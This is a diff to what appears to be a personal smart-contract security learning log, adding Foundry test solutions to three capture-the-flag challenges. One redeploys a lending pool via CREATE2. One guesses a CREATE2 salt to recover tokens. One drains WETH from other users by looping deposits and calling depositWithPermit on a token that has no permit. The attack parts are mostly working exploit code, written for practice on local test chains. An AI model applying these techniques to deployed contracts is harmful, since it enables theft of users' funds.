@@ -1252,4 +1252,102 @@ Logs:
 
 ```
 
+### 2024.09.16
+recap: https://github.com/QiLOL/AMAZEX-DSS-PARIS-Solve
+
+#### lending pool
+```solidity
+
+    function testExploit() public {
+        vm.startPrank(hacker);
+        /*//////////////////////////////////////////////////////////////
+        //                    Add your hack below!                    //
+        //                        Hack part #2                        //
+        // Please implement necessary changes also to LendingHack.sol //
+        // terminal command to run the specific test:                 //
+        // forge test --match-contract Challenge3Test -vvvv           //
+        //////////////////////////////////////////////////////////////*/
+
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        lendingHack = LendingHack(createDeployer.deploy(false, address(usdc)));
+
+        //=============================================================//
+        vm.stopPrank();
+
+        assertEq(
+            lendExGovernor.getPoolName(address(lendingPool)),
+            "LendingPool hack",
+            "lendingPool contract address now gives a different name"
+        );
+        assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
+    }
+
+```
+
+#### RescuePosi
+```solidity
+    function testWhitehatRescue() public {
+        vm.deal(whitehat, 10 ether);
+        vm.startPrank(whitehat, whitehat);
+        /*////////////////////////////////////////////////////
+        //               Add your hack below!               //
+        //                                                  //
+        // terminal command to run the specific test:       //
+        // forge test --match-contract Challenge4Test -vvvv //
+        ////////////////////////////////////////////////////*/
+        // @note we know the guy birthday in Nov, maybe it's the salt for Create2, what a try : )
+        bytes memory bytecode = type(VaultWalletTemplate).creationCode;
+        VaultWalletTemplate vault = VaultWalletTemplate(payable(FACTORY.deploy(bytecode, 11)));
+        vault.initialize(whitehat);
+        vault.withdrawERC20(address(POSI), POSI.balanceOf(address(vault)), devs);
+        //==================================================//
+        vm.stopPrank();
+
+        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
+    }
+```
+
+#### BallonVault
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        /*////////////////////////////////////////////////////
+        //               Add your hack below!               //
+        //                                                  //
+        // terminal command to run the specific test:       //
+        // forge test --match-contract Challenge5Test -vvvv //
+        ////////////////////////////////////////////////////*/
+        bytes32 na = "";
+
+
+        weth.approve(address(vault), type(uint256).max);
+        weth.deposit{value: 10 ether}();
+        
+        while(weth.balanceOf(address(attacker)) <= 1000 ether){
+            vault.deposit(1 wei, attacker); //@note WETH don't have the permit function
+            console.log(vault.totalSupply());
+            uint256 tmp = weth.balanceOf(address(attacker));
+
+            weth.transfer(address(vault), tmp); // assets.mulDiv(supply, totalAssets(), rounding) 
+        
+            uint256 max_tmp = tmp / 10**18 * 10**18;
+            uint256 max_drain = (max_tmp > weth.balanceOf(alice)) ? weth.balanceOf(alice) : max_tmp;
+            console2.log("max_drain: ", vault.previewDeposit(max_drain));
+            console2.log(max_drain, vault.totalSupply(), vault.totalAssets(), max_tmp);
+            vault.depositWithPermit(alice, max_drain, 0, 0, na, na);
+            vault.depositWithPermit(bob, max_drain, 0, 0, na, na);
+            console.log(vault.totalSupply());
+            vault.withdraw(vault.maxWithdraw(attacker), attacker, attacker);
+            console.log(weth.balanceOf(address(attacker)));
+            
+        }
+
+
+        //==================================================//
+        vm.stopPrank();
+
+        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
+    }
+```
+
 <!-- Content_END -->
